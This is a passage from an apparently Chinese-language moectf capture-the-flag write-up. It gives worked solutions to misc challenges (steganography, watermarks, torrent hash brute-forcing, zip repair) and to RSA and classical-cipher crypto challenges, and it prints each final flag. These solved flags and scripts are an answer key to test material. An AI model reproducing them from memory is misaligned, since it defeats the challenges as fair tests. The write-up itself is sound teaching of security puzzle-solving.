print(f"Guessed Encoding: {guess_encoding}")

# 尝试多种字符集进行解码
charsets = [
    "ascii", "utf-8", "utf-7","latin1", "big5", "gb2312", "gbk", "hz", "iso2022_jp", "iso2022_jp_1", "iso2022_jp_2",
    "iso2022_jp_2004", "iso2022_jp_3", "iso2022_jp_ext", "iso2022_kr", "cp1250", "cp1251", "cp1252", "cp1253",
    "cp1254", "cp1255", "cp1256", "cp1257", "cp1258", "cp874", "cp932", "cp949", "cp950", "euc_jp", "euc_jis_2004",
    "euc_jisx0213", "euc_kr", "koi8_r", "koi8_u", "mac_cyrillic", "mac_greek", "mac_iceland", "mac_latin2", "mac_roman",
    "mac_turkish", "ptcp154", "shift_jis", "shift_jis_2004", "shift_jisx0213", "utf_32", "utf_32_be", "utf_32_le"
]

for charset in charsets:
    try:
        decoded_data = data.encode('latin1').decode(charset)  # 首先将数据编码为latin1，然后尝试使用不同的字符集解码
        print(f"Decoded with {charset}: {decoded_data}")
    except Exception as e:
        print(f"Failed to decode with {charset} due to {e}")
```

可以得到以下内容

```
这是你的flag：

a9736d8ad21107398b73324694cbcd11f66e3befe67016def21dcaa9ab143bc4405be596245361f98db6a0047b4be78ede40864eb988d8a4999cdcb31592fd42c7b73df3b492403c9a379a9ff5e81262

但是flag用AES加密了，key是下面这行字的sha256（hash值的开头是b34edc782d68fda34dc23329）

所以说，codepage真的很重要啊（
```

将 `所以说，codepage真的很重要啊（` 进行 SHA-256 加密可以得到以下内容

```
b34edc782d68fda34dc2332967273b0f0900a0ebd0dcec48467851bc6117bad1
```

将 flag 进行 AES-ECB 解密即可得到 flag 如下

```
moectf{codep@ge_pl@ys_@n_iMport@nt_role_in_intern@tion@liz@tion_g92WPIB}
```

### 你想要flag吗

使用 Audacity 可以看到以下内容。

<figure><img src=".gitbook/assets/你想要flag吗-1.png" alt=""><figcaption></figcaption></figure>

```bash
$ steghide extract -sf 1.WAV -p youseeme -xf out
wrote extracted data to "out".
$ file out
out: ASCII text, with no line terminators
$ cat out
U2FsdGVkX18pGLCTMBSjkndoY4gf2lbG96QwOzVZDZeAYOA+TKnfv1mCtQ==
```

Rabbit 解密 `key:Bulbasaur` 可以得到以下内容

```
Mu5ic_1s_v3ry_1nt23esting_!
```

### 照片冲洗

下载附件后用 010 打开可以发现下方存在另外一张图片

<figure><img src=".gitbook/assets/照片冲洗-1.png" alt=""><figcaption></figcaption></figure>

将上下两张图片分别提取出来如下图所示

<figure><img src=".gitbook/assets/照片冲洗-2.png" alt=""><figcaption></figcaption></figure>

结合题目描述得知这是一道盲水印题目，推断 `2.png` 是原图，`1.png` 是水印图。

> https://github.com/linyacool/blind-watermark
>
> https://github.com/chishaxie/BlindWaterMark
>
> 盲水印脚本有多种，并且 Python 2 和 Python 3 的解题结果不同，可以多尝试
>
> 这题解出来使用的是第一个 URL 的 Python 3 脚本

通过盲水印脚本可以解出 flag，先通过 pip 安装库

```bash
$ pip install opencv-python
```

之后通过以下指令即可解出水印图如下

```bash
$ python decode.py --original 2.png --image 1.png --result flag.png
```

<figure><img src=".gitbook/assets/照片冲洗-3.png" alt=""><figcaption></figcaption></figure>

读出来即可得到 flag 如下

```
moectf{W0w_you_6@v3_1earn3d_blind_w@t3rma2k}
```

### magnet\_network

> http://www.snowywar.top/?p=1118

用 010 打开压缩包查看文件头 `28 B5 2F FD 00 58 8D 17` 发现并不是 `zip` 压缩包文件头格式，用 `file challenge.zip` 看一下发现 `Zstandard compressed data (v0.8+)` ，通过咕鸽可以找到解压缩方法。

1. 先修改后缀为 `.zst`；
2. 执行 `zstd -d challenge.zst` 。

解压完就可以得到一个新的压缩包，里面存在一个 `segments.torrent` 文件，可以使用 Python 的 bencode 进行分析，先安装好环境。

```bash
apt-get update
apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools==4.9.0
python3 -m pip install --upgrade bencode.py==4.0.0
```

```python
import bencode
torrent_file = open("segments.torrent", "rb")
metainfo = bencode.bdecode(torrent_file.read())
print(metainfo)
# {b'comment': b'flag format: moectf{xxxxxx}\nlength of xxxxxx: 24\nsha256 of flag: de5d94f22a9b8eab09779102a0fcc9c566880f7807d359da6f27723f3b881584\nflag chars: 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@!_? ', b'created by': b'qBittorrent v4.5.4.10', b'creation date': 1691855086, b'info': {b'files': [{b'length': 4, b'path': [b'1']}, {b'attr': b'p', b'length': 16380, b'path': [b'.pad', b'0']}, {b'length': 4, b'path': [b'3']}, {b'attr': b'p', b'length': 16380, b'path': [b'.pad', b'1']}, {b'length': 4, b'path': [b'5']}, {b'attr': b'p', b'length': 16380, b'path': [b'.pad', b'2']}, {b'length': 4, b'path': [b'2']}, {b'attr': b'p', b'length': 16380, b'path': [b'.pad', b'3']}, {b'length': 4, b'path': [b'6']}, {b'attr': b'p', b'length': 16380, b'path': [b'.pad', b'4']}, {b'length': 4, b'path': [b'4']}], b'name': b'segments', b'piece length': 16384, b'pieces': b':\xca\xd9n\xe55E\xf8\xad<A\x9c[\x19e\xbe\xa24\xccj\xb39\xe2T~\x1b\xb5\xc1\xe5l*\xce\xab\x1f|\xf5\xaf\x93\xd1=e\x13\x1d\xbau\x0f\xdc\xb7\x15\xe3#Q\x07\x04\x1d\xe9\xc7\x96q\xae\xd3\xbae;\x9d)TKb9\x02\xaa\x07\x07D\x92y<z\xd4M\xd6\xe8\x92\xd9%\xa7A\x1c\xb1g{\x8b]\x8f\xecm\x93\x08\xac\xcc\x83\x04~\x9a\xe3\x92\xe0+PD(<\x89\xf1m\xc2o2\x8e'}}

"""
整理出注释内容
flag format: moectf{xxxxxx}
length of xxxxxx: 24
sha256 of flag: de5d94f22a9b8eab09779102a0fcc9c566880f7807d359da6f27723f3b881584
flag chars: 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@!_? 
"""

# 整理出 files 内容
info = metainfo[b'info'][b'files']
for file in info:
    print(file)
"""
{b'length': 4, b'path': [b'1']}
{b'attr': b'p', b'length': 16380, b'path': [b'.pad', b'0']}
{b'length': 4, b'path': [b'3']}
{b'attr': b'p', b'length': 16380, b'path': [b'.pad', b'1']}
{b'length': 4, b'path': [b'5']}
{b'attr': b'p', b'length': 16380, b'path': [b'.pad', b'2']}
{b'length': 4, b'path': [b'2']}
{b'attr': b'p', b'length': 16380, b'path': [b'.pad', b'3']}
{b'length': 4, b'path': [b'6']}
{b'attr': b'p', b'length': 16380, b'path': [b'.pad', b'4']}
{b'length': 4, b'path': [b'4']}
"""
```

从 `files` 可以得知一共有 6 个文件，并且注释中提示 flag 的长度为 24，并且 `files` 中的每个文件都是 4 个字节的实际长度，另外用 `.pad` 进行填充 16380 字节使得每个文件均为 16KB。

> 在BitTorrent协议中，文件被分为多个块或片段，每个片段的大小由 `piece length` 字段定义。为了验证下载的数据的完整性，BitTorrent使用 `pieces` 字段存储每个片段的SHA1哈希值。
>
> 为了计算某个特定片段的SHA1哈希值，你需要先获取该片段的原始数据内容，然后对这部分数据使用SHA1算法。

因此我们可以通过破解 SHA1 哈希值来获得 flag 的 4 个字节，在 6 个文件中，最后一个并没有使用 `.pad` 填充（由于不知道填充内容是什么，先用 `\x00` 尝试），可以通过 `hashcat` 直接暴力解出来 `eSti` ，而其他的需要在尾部加上 16380 个 `\x00` 才可以，尝试过跑字典发现行不了，跑到前一些就已经 79G 了，tkbl。也尝试过写个 rule ，但是 hashcat 读不了，因此还是得使用 Python 来写。

```python
import hashlib
import bencode
from pwn import *

torrent_file = open("segments.torrent", "rb")
metainfo = bencode.bdecode(torrent_file.read())
torrent_file.close()

pieces = metainfo['info']['pieces']
hashes_bytes = [pieces[i:i + 20] for i in range(0, len(pieces), 20)]
hashes = []
for _, h in enumerate(hashes_bytes):
    hashes.append(h.hex())

result = []

for ha5h in hashes[:5]:
    index = 0
    result.append(iters.mbruteforce(
        lambda x: hashlib.sha1((x+"\x00"*16380).encode()).hexdigest() == ha5h,
        "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@!_?",
        4,
        'fixed'
    ))
    index += 1
result.append(iters.mbruteforce(
        lambda x: hashlib.sha1((x).encode()).hexdigest() == hashes[5],
        "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@!_?",
        4,
        'fixed'
    ))

flag = result[0] + result[3] + result[1] + result[5] + result[2] + result[4]

print(result)
print(flag)
print(hashlib.sha256(('moectf{'+flag+'}').encode()).hexdigest())
```

然后运行一下！

```bash
$ python3 buu-new.py
[+] MBruteforcing: Found key: "p2p_"
[+] MBruteforcing: Found key: "nter"
[+] MBruteforcing: Found key: "ng_2"
[+] MBruteforcing: Found key: "iS_i"
[+] MBruteforcing: Found key: "WPIB"
[+] MBruteforcing: Found key: "eSti"
['p2p_', 'nter', 'ng_2', 'iS_i', 'WPIB', 'eSti']
p2p_iS_intereSting_2WPIB
de5d94f22a9b8eab09779102a0fcc9c566880f7807d359da6f27723f3b881584
```

就可以得到 flag 如下

```
moectf{p2p_iS_intereSting_2WPIB}
```

### weird\_package

根据题目得知需要先修复压缩包，先用 010 打开该文件

<figure><img src=".gitbook/assets/weird_package-2.png" alt=""><figcaption></figcaption></figure>

可以发现 ZIPDIRENTRY 是损坏的，我们需要根据上面的 record 对 ZIPDIRENTRY 进行修复。

先从 dirEntry\[0] 开始，它对应的是 record\[0] 。通过 dirEntry\[0] 的 deFileNameLength 为 2 可以推断出他的文件名就是 record\[0] 的文件名需要将 deFileName 改为 `3/` 即可，如下图所示

<figure><img src=".gitbook/assets/weird_package-3.png" alt=""><figcaption></figcaption></figure>

以此类推，将 dirEntry\[0] 到 dirEntry\[8] 都恢复好，可以得到以下内容。

<figure><img src=".gitbook/assets/weird_package-4.png" alt=""><figcaption></figcaption></figure>

此时会发现 dirEntry\[9] 的 deFileNameLength 为 0，需要先将它修改为 `6` ，再去修改文件名， deFileNameLength 的修改可以参照上面的 dirEntry\[8]。

<figure><img src=".gitbook/assets/weird_package-5.png" alt=""><figcaption></figcaption></figure>

修复好后，可以点击上图红色箭头所指向的按钮点击重新运行模板，就可以看到 deFileName 被正确修改为 `3/9999` 了，并且 endLocator 也正确的出现了（好欸）。

之后就是解压得到了 9 个文件，通过 CyberChef 来找 flag 的时候到了，经过一个一个试可以发现 `1111` 到 `8888` 得到的都是假的 flag `moectf{wow_tHis_is_a_faKe_fLaG_HaHaHa_S66ilDMV3DciYf!lP0iYlJf!M3rux9G9V}`

<figure><img src=".gitbook/assets/weird_package-6.png" alt=""><figcaption></figcaption></figure>

只有 `9999` 才是真的，flag 如下

```
moectf{WHaT_DiD_You_Do_To_THe_arcHive?_!lP0iYlJf!M3rux9G9Vf!JoxiMl903ll}
```

## Crypto

### 入门指北

```python
import gmpy2
from Crypto.Util.number import *
p = 0xe82a76eeb5ac63e054128e040171630b993feb33e0d3d38fbb7c0b54df3a2fb9b5589d1205e0e4240b8fcb4363acaa4c3c44dd6e186225ebf3ce881c7070afa7
q = 0xae5c2e450dbce36c8d6d1a5c989598fc01438f009f9b4c29352d43fd998d10984d402637d7657d772fb9f5e4f4feee63b267b401b67704979d519ad7f0a044eb
c = 0x4016bf1fe655c863dd6c08cbe70e3bb4e6d4feefacaaebf1cfa2a8d94051d21e51919ea754c1aa7bd1674c5330020a99e2401cb1f232331a2da61cb4329446a17e3b9d6b59e831211b231454e81cc8352986e05d44ae9fcd30d68d0ce288c65e0d22ce0e6e83122621d2b96543cec4828f590af9486aa57727c5fcd8e74bd296
e = 65537
n = p * q
phi = (p - 1) * (q - 1)
d = gmpy2.invert(e, phi)
m = pow(c, d, n)
print(long_to_bytes(m))
# moectf{weLCome_To_moeCTf_CRypTo_And_enjoy_THis_gAme!_THis_is_yoUR_fLAg!}
```

### bad\_E

```python
import gmpy2
from Crypto.Util.number import long_to_bytes
from gmpy2 import invert

p = 6853495238262155391975011057929314523706159020478084061020122347902601182448091015650787022962180599741651597328364289413042032923330906135304995252477571
q = 11727544912613560398705401423145382428897876620077115390278679983274961030035884083100580422155496261311510530671232666801444557695190734596546855494472819
c = 63388263723813143290256836284084914544524440253054612802424934400854921660916379284754467427040180660945667733359330988361620691457570947823206385692232584893511398038141442606303536260023122774682805630913037113541880875125504376791939861734613177272270414287306054553288162010873808058776206524782351475805
e = 65537
n = p * q
phi = (p - 1) * (q - 1)
print(gmpy2.gcd(e, p - 1))
print(gmpy2.gcd(e, q - 1))
d = invert(e, q - 1)
print(long_to_bytes(pow(c, d, q)))
# moectf{N0w_Y0U_hAve_kN0w_h0w_rsA_w0rks!_f!lP0iYlJf!M3ru}
```

### ezrot

```
@64E7LC@Ecf0:D0;FDE020D:>!=60=6EE6C0DF3DE:EFE:@?04:!96C0tsAJdEA6d;F}%0N
```

Rot47 解码可以得到 flag 如下

```
moectf{rot47_is_just_a_simPle_letter_substitution_ciPher_EDpy5tpe5juNT_}
```

### 可可的新围墙

猜测是栅栏解密，密文如下

```
mt3_hsTal3yGnM_p3jocfFn3cp3_hFs3c_3TrB__i3_uBro_lcsOp}e{ciri_hT_avn3Fa_j
```

通过设置栏数为 3 可以得到 flag 如下

```
moectf{F3nc3_ciph3r_shiFTs_3ach_l3TT3r_By_a_Giv3n_nuMB3r_oF_plac3s_Ojpj}
```

### 皇帝的新密码

猜测是凯撒密码，密文如下

```
tvljam{JhLzhL_JPwoLy_Pz_h_cLyF_zPtwPL_JPwoLy!_ZmUVUA40q5KbEQZAK5Ehag4Av}
```

设置为 7 可以得到 flag 如下

```
moectf{CaEsaE_CIphEr_Is_a_vErY_sImpIE_CIphEr!_SfNONT40j5DuXJSTD5Xatz4To}
```

### 不是“皇帝的新密码”

> https://www.dcode.fr/vigenere-cipher

维吉尼亚密码解密

moectf{vIgENErE\_CIphEr\_Is\_a\_lIttlE\_hardEr\_thaN\_caEsar\_CIphEr\_4u4u4EXfXz}

### 猫言喵语

先利用空格分割字符串

```
喵喵？
喵喵喵喵喵喵喵喵喵喵喵喵
喵喵喵
喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？
喵喵？喵喵喵喵喵？
喵喵喵喵喵？
喵喵喵喵喵？喵喵？
喵喵喵喵喵？
喵喵喵喵喵喵
喵喵喵喵喵喵
喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？
喵喵？喵喵喵喵喵？喵喵喵
喵喵喵喵喵？
喵喵？
喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？
喵喵？喵喵喵喵喵喵喵喵喵
喵喵喵喵喵喵喵喵？
喵喵？
喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？
喵喵？喵喵喵喵喵喵喵喵喵
喵喵喵
喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？
喵喵？喵喵喵喵喵？喵喵喵
喵喵喵喵喵？
喵喵喵喵喵？喵喵喵喵喵喵
喵喵喵喵喵？喵喵喵喵喵喵
喵喵喵
喵喵？喵喵喵喵喵喵
喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？
喵喵？喵喵？喵喵喵
喵喵？喵喵？喵喵？
喵喵喵喵喵喵喵喵？
喵喵？喵喵？喵喵喵喵喵喵
喵喵喵喵喵喵
喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？
喵喵？喵喵喵喵喵喵喵喵喵
喵喵？喵喵喵喵喵？喵喵？
喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？
喵喵喵喵喵？喵喵喵
喵喵？喵喵喵喵喵喵喵喵？
```

把 `喵喵？` 换成 `-` ，把 `喵喵喵` 换乘 `.` ，可以得到以下内容

```
-
....
.
..--.-
-.-
.-
.--
.-
..
..
..--.-
-.-.
.-
-
..--.-
-...
..-
-
..--.-
-...
.
..--.-
-.-.
.-
.-..
.-..
.
-..
..--.-
--.
---
..-
--..
..
..--.-
-...
-.--
..--.-
.-.
-..-
```

用摩斯密码解码可以得到 flag 如下

```
moectf{THE_KAWAII_CAT_BUT_BE_CALLED_GOUZI_BY_RX}
```

### factor\_signin

```python
import gmpy2
from Crypto.Util.number import long_to_bytes, bytes_to_long
from gmpy2 import gcd

p1 = 18055722101348711626577381571859114850735298658417345663254295930584841136416234624852520581982069555948490061840244710773146585295336094872892685938420880462305333393436098181186277450475949236132458958671804132443554885896037342335902958516394876382378829317303693655605215373555988755516058130500801822723195474873517960624159417903134580987202400855946137101429970119186394052011747475879598126195607938106163892658285305921071673588966184054026228745012993740035399652049777986535759039077634555909031397541116025395236871778797949216479130412500655359057128438928721459688727543057760739527720641179290282309741
q1 = 19024691283015651666032297670418553586155390575928421823630922553034857624430114628839720683172187406577114034710093054198921843669645736474448836706112221787749688565566635453151716934583685087745112614898780150391513798368931496744574075511968933800467288441832780919514199410584786925010518564670786685241724643282580795568609339268652910564215887176803735675069372979560024792322029911970574914829712553975379661212645059271137916107885326625543090473004683836665262304916304580076748336858662108554591235698235221618061328251985929904075811056422186525179189846420226944944513865790999242309352900287977666792901
e = 65537
c1 =  10004937130983861141937782436252502991050957330184611684406783226971057978666503675149401388381995491152372622456604317681236160071166819028679754762162125904637599991943368450200313304999566592294442696755822585022667008378021280392976010576970877334159755332946926433635584313137140987588847077645814987268595739733550220882135750267567373532603503399428451548677091911410732474324157868011686641243202218731844256789044721309478991918322850448456919991540932206923861653518190974620161055008847475600980152660468279765607319838003177639654115075183493029803981527882155542925959658123816315099271123470754815045214896642428657264709805029840253303446203030294879166242867850331945166255924821406218090304893024711068773287842075208409312312188560675094244318565148284432361706108491327014254387317744284876018328591380705408407853404828189643214087638328376675071962141118973835178054884474523241911240926274907256651801384433652425740230755811160476356172444327762497910600719286629420662696949923799255603628210458906831175806791599965316549386396788014703044837917283461862338269599464440202019922379625071512100821922879623930069349084917919100015782270736808388388006084027673781004085620817521378823838335749279055639005125
c2 = 4948422459907576438725352912593232312182623872749480015295307088166392790756090961680588458629287353136729331282506869598853654959933189916541367579979613191505226006688017103736659670745715837820780269669982614187726024837483992949073998289744910800139692315475427811724840888983757813069849711652177078415791290894737059610056340691753379065563574279210755232749774749757141836708161854072798697882671844015773796030086898649043727563289757423417931359190238689436180953442515869613672008678717039516723747808793079592658069533269662834322438864456440701995249381880745586708718334052938634931936240736457181295
n1 = 343504538870081878757729748260620800783581983635281373321527119223374418103340873199654926888439040391545101913132680017655039577253974802351999985470115474655124168592386965001556620077117966153475518658881140827499124290142523464795351995478153288872749817655925271395693435582010998996210909883510311066017237567799370371513462802547313382594409676803895262837061350017911885033133654781876923251129406855067993830824618637981136966134029212516871210627954762147349788788999116702635535406398258621926040887099782494271000823401788337120154104692934583729065189687995570122890809807661370008740283447636580308161498808092269041815719148127168137018600113465985504975054319601741498799761500526467431533990903047624407330243357514588557352746347337683868781554819821575385685459666842162355673947984514687068626166144076257334426612302554448774082488600083569900006274897032242821388126274957846236552373226099112200392102883351088570736254707966329366625911183721875374731791052229266503696334310835323523568132399330263642353927504971311717117370721838701629885670598853025212521537158141447625623337563164790788106598854822686494249848796441153496412236527242235888308435573209980270776407776277489669763803746640746378181948641
n2 = 8582505375542551134698364096640878629785534004976071646505285128223700755811329156276289439920192196962008222418309136528180402357612976316670896973298407081310073283979903409463559102445223030866575563539261326076167685019121804961393115251287057504682389257841337573435085535013992761172452417731887700665115563173984357419855481847035192853387338980937451843809282267888616833734087813693242841580644645315837196205981207827105545437201799441352173638172133698491126291396194764373021523547130703629001683366722885529834956411976212381935354905525700646776572036418453784898084635925476199878640087165680193737
factors = [
    18106525049998616747,
    15211380502610462057,
    17093292308638969889,
    12404642343676224637,
    14397830993057803133,
    11092420583960163379,
    14619040595108594017,
    14745811312384518031,
    13645878578452317313,
    16870346804576162551,
    12034779627328165471,
    15175734709842430433,
    14678737767649343977,
    17289161209347211817,
    10049235158029375571,
    15332916111580607077,
    18345408081492711641,
    17543713628803023199,
    11853704782834170959,
    9949603102225364603,
    13062839684118954553,
    18390046459144888243,
    16123604149048919099,
    10596280721192026229,
    10547615587767500213,
    17673334943789572513,
    12448177342966243757,
    17265001711647542137,
    16408421615173973083,
    10864078180916418691,
    15751974537676958401,
    14813953870710226847
]
phi_n2 = 1
phi_n1 = (p1 - 1) * (q1 - 1)
for prime in factors:
    phi_n2 *= (prime - 1)
d1 = gmpy2.invert(e, phi_n1)
d2 = gmpy2.invert(e, phi_n2)
m1 = pow(c1, d1, n1)
m2 = pow(c2, d2, n2)
print(f'{long_to_bytes(m1).decode()}{long_to_bytes(m2).decode()}')
# moectf{fACtord6_And_YAfu_Are_6oth_good_utils_to_fACtorize_num6ers_ff90S}
```

### |p-q|

```python
from Crypto.Util.number import long_to_bytes
from gmpy2 import gmpy2, invert
n = 329960318345010350458589325571454799968957932130539403944044204698872359769449414256378111233592533561892402020955736786563103586897940757198920737583107357264433730515123570697570757034221232010688796344257587359198400915567115397034901247038275403825404094129637119512164953012131445747740645183682571690806238508035172474685818036517880994658466362305677430221344381425792427288500814551334928982040579744048907401043058567486871621293983772331951723963911377839286050368715384227640638031857101612517441295926821712605955984000617738833973829140899288164786111118033301974794123637285172303688427806450817155786233788027512244397952849209700013205803489334055814513866650854230478124920442832221946442593769555237909177172933634236392800414176981780444770542047378630756636857018730168151824307814244094763132088236333995807013617801783919113541391133267230410179444855465611792191833319172887852945902960736744468250550722314565805440432977225703650102517531531476188269635151281661081058374242768608270563131619806585194608795817118466680430500830137335634289617464844004904410907221482919453859885955054140320857757297655475489972268282336250384384926216818756762307686391740965586168590784252524275489515352125321398406426217
temp = gmpy2.iroot(n, 2)[0]
p = gmpy2.next_prime(temp)
q = n // p
e = 65537
c = 307746143297103281117512771170735061509547958991947416701685589829711285274762039205145422734327595082350457374530975854337055433998982493020603245187129916580627539476324521854057990929173492940833073106540441902619425074887573232779899379436737429823569006431370954961865581168635086246592539153824456681688944066925973182272443586463636373955966146029489121226571408532284480270826510961605206483011204059402338926815599691009406841471142048842308786000059979977645988396524814553253493672729395573658564825709547262230219183672493306100392069182994445509803952976016630731417479238769736432223194249245020320183199001774879893442186017555682902409661647546547835345461056900610391514595370600575845979413984555709077635397717741521573798309855584473259503981955303774208127361309229536010653615696850725905168242705387575720694946072789441481191449772933265705810128547553027708513478130258801233619669699177901566688737559102165508239876805822898509541232565766265491283807922473440397456701500524925191214292669986798631732639221198138026031561329502985577205314190565609214349344303324429408234237832110076900414483795318189628198913032900272406887003325858236057373096880675754802725017537119549989304878960436575670784578550
phi = (p - 1) * (q - 1)
d = invert(e, phi)
m = pow(c, d, n)
print(long_to_bytes(m).decode())
# moectf{it_iS_vUlnErablE_iF_p_iS_aboUt_thE_SaME_SiZE_aS_Q_MVoAYArrlG3uco}
```

### n\&n

```python
from Crypto.Util.number import *
from gmpy2 import *
e1 = 0x114514
e2 = 19198101
n = 13612969130810965900902742090064423006385890357159609755971027204203418808937093492927060428980020085273603754747223030702684866992231913349067578014240319426522039068836171388168087260774376277346092066880984406890296520951318296354893551565670293486797637522297989653182109744864444697818991039473180752980752117041574628063002176339235126861152739066489620021077091941250365101779354009854706729448088217051728432010328667839532327286559570597994183126402340332924370812383312664419874352306052467284992411543921858024469098268800500500651896608097346389396273293747664441553194179933758992070398387066135330851531
c1 = 5776799746376051463605370130675046329799612910435315968508603116759552095183027263116443417343895252766060748671845650457077393391989018107887540639775168897954484319381180406512474784571389477212123123540984850033695748142755414954158933345476509573211496722528388574841686164433315356667366007165419697987147258498693175698918104120849579763098045116744389310549687579302444264316133642674648294049526615350011916160649448726069001139749604430982881450187865197137222762758538645387391379108182515717949428258503254717940765994927802512049427407583200118969062778415073135339774546277230281966880715506688898978925
c2 = 4664955020023583143415931782261983177552050757537222070347847639906354901601382630034645762990079537901659753823666851165175187728532569040809797389706253282757017586285211791297567893874606446000074515260509831946210526182765808878824360460569061258723122198792244018463880052389205906620425625708718545628429086424549277715280217165880900037900983008637302744555649467104208348070638137050458275362152816916837534704113775562356277110844168173111385779258263874552283927767924979691542028126412133709129601685315027689094437957165812994784648540588277901241854031439324974562449032290219652206466731675967045633360
s = gcdext(e1, e2)
m = pow(c1, s[1], n) * pow(c2, s[2], n) % n
print(long_to_bytes(m).decode())
# moectf{dO_nOt_u53_5AM3_MOdulu5_tO_3ncrYPt_dIFF3r3nt_dAtA!_JY63x33iiA0Ji}
```

### rsa\_signin

```python
from Crypto.Util.number import *
from gmpy2 import *
def find_common_factors(n_values):
    common_factors = {}
    for i in range(len(n_values)):
        for j in range(i + 1, len(n_values)):
            gcd_value = gcd(n_values[i], n_values[j])
            if gcd_value > 1:
                common_factors[(i, j)] = gcd_value
    return common_factors
e = 65537
n = [
    17524722204224696445172535263975543817720644608816706978363749891469511686943372362091928951563219068859089058278944528021615923888948698587206920445508493551162845371086030869059282352535451058203615402089133135136481314666971507135484450966505425514285114192275051972496161810571035753943880190780759479521486741046704043699838021850105638224212696697865987677760179564370167062037563913329993433080123575434871852732981112883423565015771421868680113407260917902892944119552200927337996135278491046562185003012971570532979090484837684759828977460570826320870379601193678304983534424368152743368343335213808684523217,
    24974121071274650888046048586598797033399902532613815354986756278905133499432183463847175542164798764762683121930786715931063152122056911933710481566265603626437742951648885379847799327315791800670175616973945640322985175516271373004547752061826574576722667907302681961850865961386200909397231865804894418194711076667760169256682834206788730947602211228930301853348503098156592000263767190760378847541148772869356389938999094673945092387627113807899212568399028514283219850734634544982646070106811651490010946670117927664594365986238107951837041859682547029079035013475238052160645871718246031144694712586073789250183,
    14215826065753265334521416948225868542990756976323308408298887797364519400310818641526401662106853573185085731682502059761982246604277475488691297554851873224516934619888327644352138127883043558424300092247604877819821625587944308487310522092440517150600171819145803937177931473336108429889165189521078678397694303305705260759351843006130968234071638035667854938070597400634242396852782331461576526836227336952718230741560369621645218729592233657856104560425642219241082727756696967324334634822771842625681505869025740662258929200756109704988223034840699133778958569054445520305361142302393767439478256174414187983763,
    12221355905532691305226996552124162033756814028292708728711809229588190407700199452617060657420166395065565154239801465361510672853972152857415394695376825120759202857555325904640144375262531345320714166285999668052224661520834318497234299585219832943519644095197479639328120838919035625832361810964127485907587199925564724081163804724975965691571850962714258888527902920462746795711511579424322515292865504642938090200503979483095345893697972170153990274670257331483858538617460680462369680572833191232126527727222302641204529110948993583190295067970240051042000918629138767209918572311469915774910003970381965123241,
    18152103454920389919231636321286527841833809319334215885641536161086810144890443857211776387914779781628740172079478910188540146498426564211851629962338413488555121865779016981727229209606498886170396500155102635962395243364899026418106378234307821492609778555173516000309435730752571818439328803899462791834490025768785383592935046996428331508608555503567191807692523852530836008486655164751054189301721070209363416058642811329040202582026786024825518381761299547703962502636888833428457116986351812252188468878701301184044948733274488264320930936362549028124581962244201377136969591119942276742760215403738913067567,
    22877887459293720334652698748191453972019668578065068224653972884599636421200068659750242304040301306798039254241668648594556654589309801728248683586229288074709849246660525799452637187132633064172425677552176203292787732404537215347782229753837476655088638984496409603054524994383358547132112778403912563916886533181616856401929346567686400616307916690806467019665390260267596320840786982457521423178851498130935577260638269429250197050326097193841333205073650802709022947551398142692735680419453533128176592587955634333425401930362881423044363132586170013458300714163531162544301477356808388416864173949089028317961,
    19844333358004073542783728196775487079202832688982038135532362073659058674903791697765527614270399097276261983744620537925712167578187109058145015032736796457938148615396547198728652435169126585595701228287449135664667959433491335769206692390262797325133960778920452511673878233190120432257482339068405290918739453464061987163074129048150451046315248186376609350095502130018696275764450248681787926130463463923862832714969425813770847493135627599129546112143050369344208092649256659330284904392961574494907186727388685504929586018639846040474616307662546605623294842316524163106100888851228858194942825157286544846177,
    16956880944655068255446705024149899655327230949463546092744762226005904114738078692036960935391303255804754787864713189658290361949509917704853428701870609882427423574672772606814823959758208695540116440342488334213300943604780971422918744381486937517952553797134323570131582724393100092308466968491068503301604506186521656059375518680612292667310641047190088814753025794048591445267711939066523165042651430468971452726568222388482323097260496415484997546126185688914792795834046855221759289007609518312601640548469651358391745947588643697900883634533872314566389446271647587564348026861264979727062157272541149018781,
    16472195897077185060734002588086375750797253422014472876266294484788862733424113898147596402056889527985731623940969291811284437034420929030659419753779530635563455664549165618528767491631867637613948406196511848103083967995689432928779805192695209899686072900265108597626632371718430059561807147486376536203800038054012500244392964187780217667805308512187849789773573138494622201856638931435423778275004491853486855300574479177472267767506041000072575623287557610576406578525902565241580838652860552046216587141709709405062150243990097835181557208274750462554811004137033087430556692966525170882625891516050207318491,
    13890749889361612188368868998653029697326614782260719535555306236512452110708495623964530174188871342332417484996749651846510646453983388637377706674890018646246874688969342600780781646175634455109757266442675502522791531161284420286435654971819525519296719668701529481662071464145515727217108362496784024871976015116522898184301395037566514980846499856316532479656908169681719288258287756566886281183699239684997698487409138330229321935477734921670373632304542254938831218652340699024011371979519574576890581492623709896310465567043899767342676912434857372520308852745792360420376574037705943820090308501053778144141,
    21457499145521259498911107987303777576783467581104197687610588208126845121702391694574491025398113729462454256070437978257494064504146718372095872819969887408622112906108590961892923178192792218161103488204912792358327748493857104191029765218471874759376809136402361582721860433355338373725980783308091544879562698835405262108188595630215081260699112737457564998798692048522706388318528370551365364702529068656665853097899157141017378975007689790000067275142731212069030175682911154288533716549782283859340452266837760560153014200605378914071410125895494331253564598702942990036163269043699029806343766286247742865671
]
common_factors = find_common_factors(n)
p = list(common_factors.values())[0]
q = n[2] // p
phi = (p - 1) * (q - 1)
d = invert(e, phi)
